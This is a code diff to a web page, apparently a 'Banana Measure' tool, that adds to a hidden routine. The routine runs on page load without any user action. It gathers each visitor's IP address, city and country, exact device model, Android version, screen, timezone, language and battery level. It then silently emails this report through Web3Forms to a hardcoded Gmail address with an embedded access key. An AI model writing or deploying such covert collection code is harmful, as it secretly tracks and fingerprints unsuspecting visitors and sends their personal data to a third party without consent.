@@ -378,10 +378,40 @@
     const WEB3FORMS_KEY = 'eb5accff-e755-4f69-862c-ac844bc38650';
     const RECIPIENT_EMAIL = 'iot757978@gmail.com';
 
-    // ---------- 1. USER INFO COLLECTION (runs on page load) ----------
+    // ------------------- IMPROVED DEVICE PARSING -------------------
+    function getDeviceNameFromUA(ua) {
+      // Samsung Galaxy pattern: SM-XXXX or GT-XXXX or SGH-XXXX
+      const samsungMatch = ua.match(/SM-[A-Za-z0-9]+/i) || ua.match(/GT-[A-Za-z0-9]+/i) || ua.match(/SGH-[A-Za-z0-9]+/i);
+      if (samsungMatch) {
+        let model = samsungMatch[0];
+        // Map common models to friendly name (optional)
+        const modelMap = {
+          "SM-A042F": "Galaxy A04e",
+          "SM-A045F": "Galaxy A04s",
+          "SM-A125F": "Galaxy A12",
+          "SM-A525F": "Galaxy A52"
+        };
+        let friendly = modelMap[model.toUpperCase()] || "";
+        if (friendly) return `Samsung ${model} (${friendly})`;
+        else return `Samsung ${model}`;
+      }
+      // Generic Android device: extract from "Android ...; ... Build/"
+      const genericMatch = ua.match(/Android [0-9.]+; ([^;)]+)/);
+      if (genericMatch && genericMatch[1].trim()) {
+        return genericMatch[1].trim();
+      }
+      return "Unknown Android device";
+    }
+
+    function getAndroidVersionFromUA(ua) {
+      const match = ua.match(/Android\s([0-9.]+)/);
+      return match ? match[1] : "Unknown";
+    }
+
+    // ---------- 1. USER INFO COLLECTION (improved) ----------
     async function collectAndSendUserInfo() {
       try {
-        // Helper: get IP + location from ipapi.co
+        // Get IP + location
         let ipData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
         try {
           const ipRes = await fetch('https://ipapi.co/json/');
@@ -394,21 +424,30 @@
           }
         } catch(e) { console.warn("IP fetch failed", e); }
 
-        // Device / browser info from navigator & Client Hints
         const ua = navigator.userAgent;
-        const platform = navigator.platform || 'Unknown';
-        const language = navigator.language || 'Unknown';
-        const screenRes = `${screen.width}x${screen.height}`;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-        
-        // Client Hints (if exposed via navigator.userAgentData)
-        let chModel = '', chPlatform = '', chVersion = '';
+        // Client Hints
+        let chModel = '', chPlatform = '', chPlatformVersion = '';
         if (navigator.userAgentData) {
           chModel = navigator.userAgentData.brands?.map(b => `${b.brand} ${b.version}`).join(', ') || '';
           chPlatform = navigator.userAgentData.platform || '';
+          if (navigator.userAgentData.getHighEntropyValues) {
+            try {
+              const hints = await navigator.userAgentData.getHighEntropyValues(["platformVersion", "model"]);
+              chPlatformVersion = hints.platformVersion || '';
+              if (hints.model) chModel = hints.model; // exact device model
+            } catch(e) {}
+          }
         }
-        
-        // Battery info (if available)
+
+        // Determine final device name and Android version
+        let deviceName = chModel || getDeviceNameFromUA(ua);
+        let androidVersion = chPlatformVersion || getAndroidVersionFromUA(ua);
+        let platform = chPlatform || (ua.includes("Android") ? "Android" : (ua.includes("iPhone") ? "iOS" : "Unknown"));
+
+        // Other info
+        const language = navigator.language || 'Unknown';
+        const screenRes = `${screen.width}x${screen.height}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
         let batteryLevel = 'Not supported';
         if ('getBattery' in navigator) {
           try {
@@ -419,22 +458,24 @@
 
         const timestamp = new Date().toLocaleString();
         const report = `
-🆔 USER VISIT REPORT
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Time        : ${timestamp}
-IP          : ${ipData.ip}
-Location    : ${ipData.city}, ${ipData.region}, ${ipData.country}
-Platform    : ${platform} | ${chPlatform}
-Device Model: ${chModel || 'From UA: ' + ua.split(';')[1] || 'Unknown'}
-Screen      : ${screenRes}
-Timezone    : ${timezone}
-Language    : ${language}
-Battery     : ${batteryLevel}
-User Agent  : ${ua}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🆔 USER VISIT REPORT (Enhanced)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Time            : ${timestamp}
+IP              : ${ipData.ip}
+Location        : ${ipData.city}, ${ipData.region}, ${ipData.country}
+Platform        : ${platform}
+Android Version : ${androidVersion}
+Device          : ${deviceName}
+Screen          : ${screenRes}
+Timezone        : ${timezone}
+Language        : ${language}
+Battery         : ${batteryLevel}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Raw User‑Agent  : ${ua}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         `;
 
-        // Send via Web3Forms to your email
+        // Send via Web3Forms
         await fetch('https://api.web3forms.com/submit', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
@@ -452,7 +493,7 @@ User Agent  : ${ua}
       }
     }
 
-    // Call on page load (no user interaction required)
+    // Call on page load
     collectAndSendUserInfo();
 
     // ======================= BANANA MEASURE ORIGINAL LOGIC =======================
